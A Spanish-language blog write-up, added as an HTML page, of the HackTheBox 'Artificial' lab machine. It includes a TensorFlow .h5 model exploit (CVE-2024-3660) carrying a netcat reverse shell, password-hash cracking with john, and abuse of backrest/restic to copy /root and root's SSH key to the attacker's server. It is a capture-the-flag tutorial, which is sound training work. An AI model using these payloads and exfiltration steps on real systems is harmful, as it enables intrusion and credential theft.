@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Artificial Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="
+
+Tags: #Linux
+
+
+
+  Enumeración Nmap
+  
+    
+    Link to heading
+  
+
+Comando:
+nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts
+
+Utilizamos whatweb para sacar más información del sitio web y nos da el nombre de dominio http://artificial.htb
+
+lo cual agregamos a nuestro /etc/hosts
+
+# Enumeración puerto HTTP 80
+Entramos a la página web y solo tenemos dos opciones /login /register
+
+Además nos aparece un código de ejemplo de un archivo .h5 que es usado para IAs
+
+Nos registramos al sitio web
+
+y nos logueamos y vemos que nos da la posibilidad de subir un archivo .h5
+
+Además encontramos dos archivos interesantes para descargar, el primero requirements, el cual nos da la versión de tensorflow-cpu=2.13.1
+y el Dockerfile para compilar nuestro archivo .h5
+">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Artificial Machine - HackTheBox">
+  <meta name="twitter:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
+nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts Utilizamos whatweb para sacar más información del sitio web y nos da el nombre de dominio http://artificial.htb lo cual agregamos a nuestro /etc/hosts # Enumeración puerto HTTP 80 Entramos a la página web y solo tenemos dos opciones /login /register Además nos aparece un código de ejemplo de un archivo .h5 que es usado para IAs Nos registramos al sitio web y nos logueamos y vemos que nos da la posibilidad de subir un archivo .h5 Además encontramos dos archivos interesantes para descargar, el primero requirements, el cual nos da la versión de tensorflow-cpu=2.13.1 y el Dockerfile para compilar nuestro archivo .h5">
+
+<meta property="og:url" content="https://celero0.github.io/posts/artificial/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Artificial Machine - HackTheBox">
+  <meta property="og:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
+nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts Utilizamos whatweb para sacar más información del sitio web y nos da el nombre de dominio http://artificial.htb lo cual agregamos a nuestro /etc/hosts # Enumeración puerto HTTP 80 Entramos a la página web y solo tenemos dos opciones /login /register Además nos aparece un código de ejemplo de un archivo .h5 que es usado para IAs Nos registramos al sitio web y nos logueamos y vemos que nos da la posibilidad de subir un archivo .h5 Además encontramos dos archivos interesantes para descargar, el primero requirements, el cual nos da la versión de tensorflow-cpu=2.13.1 y el Dockerfile para compilar nuestro archivo .h5">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-25T23:43:48+00:00">
+    <meta property="article:modified_time" content="2025-11-25T23:43:48+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/artificial/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/artificial/">
+              Artificial Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-11-25T23:43:48Z">
+                November 25, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Linux</li>
+</ul>
+<hr>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.74 -oG allPorts
+</span></span></code></pre></div><img src="/images/Pasted image 20250918024121.png" style="width:100%; height:auto; display:block; margin:auto;">
+Utilizamos whatweb para sacar más información del sitio web y nos da el nombre de dominio http://artificial.htb
+<img src="/images/Pasted image 20250918024227.png" style="width:100%; height:auto; display:block; margin:auto;">
+lo cual agregamos a nuestro /etc/hosts
+<img src="/images/Pasted image 20250918024249.png" style="width:100%; height:auto; display:block; margin:auto;">
+# Enumeración puerto HTTP 80
+<p>Entramos a la página web y solo tenemos dos opciones /login /register
+<img src="/images/Pasted image 20250918024424.png" style="width:100%; height:auto; display:block; margin:auto;">
+Además nos aparece un código de ejemplo de un archivo .h5 que es usado para IAs
+<img src="/images/Pasted image 20250918024511.png" style="width:100%; height:auto; display:block; margin:auto;">
+Nos registramos al sitio web
+<img src="/images/Pasted image 20250918024549.png" style="width:100%; height:auto; display:block; margin:auto;">
+y nos logueamos y vemos que nos da la posibilidad de subir un archivo .h5
+<img src="/images/Pasted image 20250918024651.png" style="width:100%; height:auto; display:block; margin:auto;">
+Además encontramos dos archivos interesantes para descargar, el primero requirements, el cual nos da la versión de tensorflow-cpu=2.13.1
+y el Dockerfile para compilar nuestro archivo .h5
+<img src="/images/Pasted image 20250918030336.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="explotación">
+  Explotación
+  <a class="heading-link" href="#explotaci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Buscando por vulnerabilidad de tensorflow 2.13.1 encontramos cve 2024-3660, por tanto buscamos un poc y tenemos la primera página github
+<img src="/images/Pasted image 20250918031135.png" style="width:100%; height:auto; display:block; margin:auto;">
+Nos vamos al exploit.py que tiene el siguiente código con reverse shell
+<img src="/images/Pasted image 20250918031211.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">tensorflow</span> <span style="color:#ff7b72">as</span> <span style="color:#ff7b72">tf</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">exploit</span>(x):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 6666 &gt;/tmp/f&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model <span style="color:#ff7b72;font-weight:bold">=</span> tf<span style="color:#ff7b72;font-weight:bold">.</span>keras<span style="color:#ff7b72;font-weight:bold">.</span>Sequential()
+</span></span><span style="display:flex;"><span>model<span style="color:#ff7b72;font-weight:bold">.</span>add(tf<span style="color:#ff7b72;font-weight:bold">.</span>keras<span style="color:#ff7b72;font-weight:bold">.</span>layers<span style="color:#ff7b72;font-weight:bold">.</span>Input(shape<span style="color:#ff7b72;font-weight:bold">=</span>(<span style="color:#a5d6ff">64</span>,)))
+</span></span><span style="display:flex;"><span>model<span style="color:#ff7b72;font-weight:bold">.</span>add(tf<span style="color:#ff7b72;font-weight:bold">.</span>keras<span style="color:#ff7b72;font-weight:bold">.</span>layers<span style="color:#ff7b72;font-weight:bold">.</span>Lambda(exploit))
+</span></span><span style="display:flex;"><span>model<span style="color:#ff7b72;font-weight:bold">.</span>compile()
+</span></span><span style="display:flex;"><span>model<span style="color:#ff7b72;font-weight:bold">.</span>save(<span style="color:#a5d6ff">&#34;exploit.h5&#34;</span>)
+</span></span></code></pre></div><p>Para correr el script necesitamos tener instalado  tensorflow, para eso utilizaremos el archivo Dockerfile que nos dió la web</p>
+<p>haremos el siguiente comando para crear la imagen</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker build -t python_tensor .
+</span></span></code></pre></div><img src="/images/Pasted image 20250918031617.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Posteriormente utilizaremos el siguiente comando para entrar en la imagen</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -it --rm python_tensor
+</span></span></code></pre></div><img src="/images/Pasted image 20250918031742.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Una vez dentro del contenedor, instalamos nano para crear nuestros script en python</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt-get update <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> apt-get install -y nano
+</span></span></code></pre></div><p>Y creamos nuestro exploit.py con el script que encontramos en github, editando la IP y puerto en escucha
+<img src="/images/Pasted image 20250918032005.png" style="width:100%; height:auto; display:block; margin:auto;">
+ahora corremos el script y nos creará el archivo &ldquo;exploit.h5&rdquo;
+<img src="/images/Pasted image 20250918032122.png" style="width:100%; height:auto; display:block; margin:auto;">
+Pasamos el exploit.h5 hacia nuestra máquina local con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker ps
+</span></span><span style="display:flex;"><span>docker cp <span style="color:#ff7b72;font-weight:bold">[</span>id del contenedor<span style="color:#ff7b72;font-weight:bold">]</span>:/code/exploit.h5 /home/kali/Desktop/Artificial/exploit.h5
+</span></span></code></pre></div><img src="/images/Pasted image 20250918032516.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Con el archivo en nuestra máquina local, nos pondremos en escucha, y subiremos el exploit.h5
+<img src="/images/Pasted image 20250918032643.png" style="width:100%; height:auto; display:block; margin:auto;">
+<img src="/images/Pasted image 20250918032657.png" style="width:100%; height:auto; display:block; margin:auto;">
+Consiguiendo consola</p>
+<h1 id="tratamiento-tty">
+  Tratamiento tty
+  <a class="heading-link" href="#tratamiento-tty">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>ctrl+z
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>reset xterm
+</span></span><span style="display:flex;"><span>export <span style="color:#79c0ff">TERM</span><span style="color:#ff7b72;font-weight:bold">=</span>xterm
+</span></span><span style="display:flex;"><span>export <span style="color:#79c0ff">SHELL</span><span style="color:#ff7b72;font-weight:bold">=</span>/bin/bash
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#a5d6ff">39</span> columns <span style="color:#a5d6ff">157</span>
+</span></span></code></pre></div><h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Dentro del sistema, vemos 3 usuarios con consola. app, gael y root.
+Por tanto nuestro objetivo será migrar hacia el usuario gael
+<img src="/images/Pasted image 20250918033954.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Una vez dentro de la máquina víctima nos encontramos las siguientes carpetas, dentro de instance encontramos users.db
+<img src="/images/Pasted image 20250918033232.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Nos conectaremos a la base de datos con sqlite3, debido que en el archivo app.py nos muestra que se usa esa base de datos
+<img src="/images/Pasted image 20250918033411.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite3 users.db
+</span></span></code></pre></div><p>Dentro de la base de datos tenemos dos tablas, model y user
+en la tabla user tenemos usuarios, correos y contraseñas hasheadas
+<img src="/images/Pasted image 20250918033542.png" style="width:100%; height:auto; display:block; margin:auto;">
+Guardamos el hash del usuario gael
+<img src="/images/Pasted image 20250918034019.png" style="width:100%; height:auto; display:block; margin:auto;">
+Analizandolo podemos ver que es un hash en md5, por tanto utilizaremos john para desencriptarlo, con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#ff7b72;font-weight:bold">=</span>raw-md5 hash.txt
+</span></span></code></pre></div><img src="/images/Pasted image 20250918034806.png" style="width:100%; height:auto; display:block; margin:auto;">
+La contraseña es: mattp005numbertwo, por tanto nos conectaremos por ssh con el usuario gael y esa contraseña
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh gael@artificial.htb
+</span></span></code></pre></div><img src="/images/Pasted image 20250918034933.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Obtenemos la flag de user.txt
+57d1b624447107af7760f746fe049faa
+<img src="/images/Pasted image 20250918181854.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Viendo los puertos activos en la máquina víctima tenemos el puerto 5000, que es el que está corriendo el puerto 80 y el puerto 9898</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -alpn | grep <span style="color:#a5d6ff">&#34;127.0.0.1&#34;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20250918184133.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Realizaremos un local portfowarding para ver el servicio del puerto 9898</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L <span style="color:#ff7b72;font-weight:bold">[</span>puerto_local<span style="color:#ff7b72;font-weight:bold">]</span>:localhost:<span style="color:#ff7b72;font-weight:bold">[</span>puerto_remoto<span style="color:#ff7b72;font-weight:bold">]</span> usuario@servidor_ssh
+</span></span></code></pre></div><p>En este caso</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 9898:localhost:9898 gael@artificial.htb
+</span></span></code></pre></div><img src="/images/Pasted image 20250918184408.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora abrimos un navegador y usamos http://localhost:9898
+<img src="/images/Pasted image 20250918184608.png" style="width:100%; height:auto; display:block; margin:auto;">Buscamos en internet qué es backrest, y encontramos que es una aplicación web para hacer backup&rsquo;s para una aplicación CLI llamada restic backup
+<img src="/images/Pasted image 20250918185725.png" style="width:100%; height:auto; display:block; margin:auto;">
+por tanto buscaremos archivos backup en el sistema</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *backup*  2&gt;/dev/null | grep -vE <span style="color:#a5d6ff">&#34;lib|headers&#34;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20250918190524.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>el archivo backrest_backup.tar.gz parece interesante, lo copiamos a nuestra carpeta /tmp</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /var/backups/backrest_backup.tar.gz /tmp/backrest_backup.tar.gz
+</span></span></code></pre></div><p>y luego lo descomprimimos con tar</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tar -xf backrest_backup.tar.gz
+</span></span></code></pre></div><img src="/images/Pasted image 20250918190818.png" style="width:100%; height:auto; display:block; margin:auto;">
+vamos a la carpeta backrest y hacemos ls -la, donde encontramos una carpeta .config
+<img src="/images/Pasted image 20250918190852.png" style="width:100%; height:auto; display:block; margin:auto;">
+Dentro de ella hay otra carpeta backrest, y dentro hay un archivo config.json
+<img src="/images/Pasted image 20250918190922.png" style="width:100%; height:auto; display:block; margin:auto;">
+El archivo contiene nombre de usuario: backrest_root y contraseña: JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
+<img src="/images/Pasted image 20250918191029.png" style="width:100%; height:auto; display:block; margin:auto;">
+La contraseña dice ser bcrypt pero no tiene el formato correcto, parece estar en base64, por tanto haremos un base64 -d 
+```bash
+echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
+```
+<img src="/images/Pasted image 20250918191210.png" style="width:100%; height:auto; display:block; margin:auto;">
+Ahora parece estar bien el hash bcrypt, lo guardamos en un archivo llamado bcrypt.txt y utilizaremos john para descifrarlo
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt bcrypt.txt
+```
+Consiguiendo la contraseña `!@#$%^`
+<img src="/images/Pasted image 20250918191413.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto nos conectaremos a backrest web con las siguientes credenciales
+<code>backrest_root:!@#$%^</code>
+Nos conectamos exitosamente
+<img src="/images/Pasted image 20250918191557.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h2 id="abusando-de-restic-sudo">
+  Abusando de restic sudo
+  <a class="heading-link" href="#abusando-de-restic-sudo">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para escalar privilegios aprovecharemos que  restic se corre como root, para eso realizaremos una copia de seguridad de /root/ y la enviaremos a nuestra máquina local, para ver la flag root.txt y además ver sus claves rsa</p>
+<h3 id="descargando-restic-server">
+  Descargando restic server
+  <a class="heading-link" href="#descargando-restic-server">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>En nuestra máquina local necesitamos descargar restic-server</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/restic/rest-server.git
+</span></span><span style="display:flex;"><span>cd rest-server
+</span></span></code></pre></div><p>Además necesitaremos instalar go, podemos buscar en internet como hacerlo.
+Luego de tener go hacemops los siguientes comandos</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">GOARCH</span><span style="color:#ff7b72;font-weight:bold">=</span>amd64 <span style="color:#79c0ff">GOOS</span><span style="color:#ff7b72;font-weight:bold">=</span>linux go build -o rest-server ./cmd/rest-server  
+</span></span><span style="display:flex;"><span>./rest-server --path /tmp/restictemp --listen :8888 --no-auth
+</span></span></code></pre></div><img src="/images/Pasted image 20250918192309.png" style="width:100%; height:auto; display:block; margin:auto;">
+### Creamos el repositorio en la web
+<p>En la web creamos el repositorio con los siguientes datos</p>
+<pre tabindex="0"><code>Name: backuprepo  
+Repository URI: /opt/backrest  
+Password: test12345
+</code></pre><p><img src="/images/Pasted image 20250918192446.png" style="width:100%; height:auto; display:block; margin:auto;">Y le damos a Submit
+<img src="/images/Pasted image 20250918192504.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h3 id="corremos-comandos-en-backrest">
+  Corremos comandos en backrest
+  <a class="heading-link" href="#corremos-comandos-en-backrest">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>En la web vamos al apartado de nuestro repositorio creado y le damos a &ldquo;Run command&rdquo;
+<img src="/images/Pasted image 20250918192641.png" style="width:100%; height:auto; display:block; margin:auto;">en &ldquo;Run command&rdquo; escribimos los siguientes comandos</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-r rest:http://10.10.14.49:8888/backuprepo init
+</span></span></code></pre></div><img src="/images/Pasted image 20250918192912.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Luego ponemos el siguiente comando, que hace el backup de la carpeta /root de la máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-r rest:http://10.10.14.49:8888/backuprepo backup /root
+</span></span></code></pre></div><p>Si todo salió bien tenemos los dos iconos de consola verde
+<img src="/images/Pasted image 20250918193500.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h3 id="recuperar-el-backup-en-máquina-local">
+  Recuperar el backup en máquina local
+  <a class="heading-link" href="#recuperar-el-backup-en-m%c3%a1quina-local">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Ahora en nuestra <em>Máquina local</em> utilizaremos los siguientes comandos para obtener los backups de la máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>restic -r /tmp/restictemp/backuprepo snapshots  
+</span></span></code></pre></div><p>y ponemos la contraseña que creamos &ldquo;test12345&rdquo;
+<img src="/images/Pasted image 20250918193538.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Acá debemos poner el ID que aparece como output en el comando anterior</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>restic -r /tmp/restictemp/backuprepo restore &lt;snapshot_id&gt; --target /tmp/restore
+</span></span></code></pre></div><p>y ponemos nuevamente la contraseña &ldquo;test12345&rdquo;
+<img src="/images/Pasted image 20250918193722.png" style="width:100%; height:auto; display:block; margin:auto;">
+y finalmente obtenemos el backup de /root/ de la máquina víctima en /tmp/restore de nuestra máquina local</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp/restore
+</span></span></code></pre></div><img src="/images/Pasted image 20250918193825.png" style="width:100%; height:auto; display:block; margin:auto;">
+y obtenemos la flag de root.txt
+<img src="/images/Pasted image 20250918193856.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="post-explotación">
+  Post explotación
+  <a class="heading-link" href="#post-explotaci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Conseguiremos la conexión a la máquina mediante el robo de su clave RSA</p>
+<p>ya tenemos el id_rsa del usuario root de la máquina víctima
+<img src="/images/Pasted image 20250918194113.png" style="width:100%; height:auto; display:block; margin:auto;">
+por tanto cambiaremos los permisos a 400 con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#a5d6ff">400</span> id_rsa
+</span></span></code></pre></div><img src="/images/Pasted image 20250918194217.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y nos conectaremos por ssh de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa root@artificial.htb
+</span></span></code></pre></div><img src="/images/Pasted image 20250918194328.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y así pwneamos la máquina
+<img src="/images/Pasted image 20250918194352.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
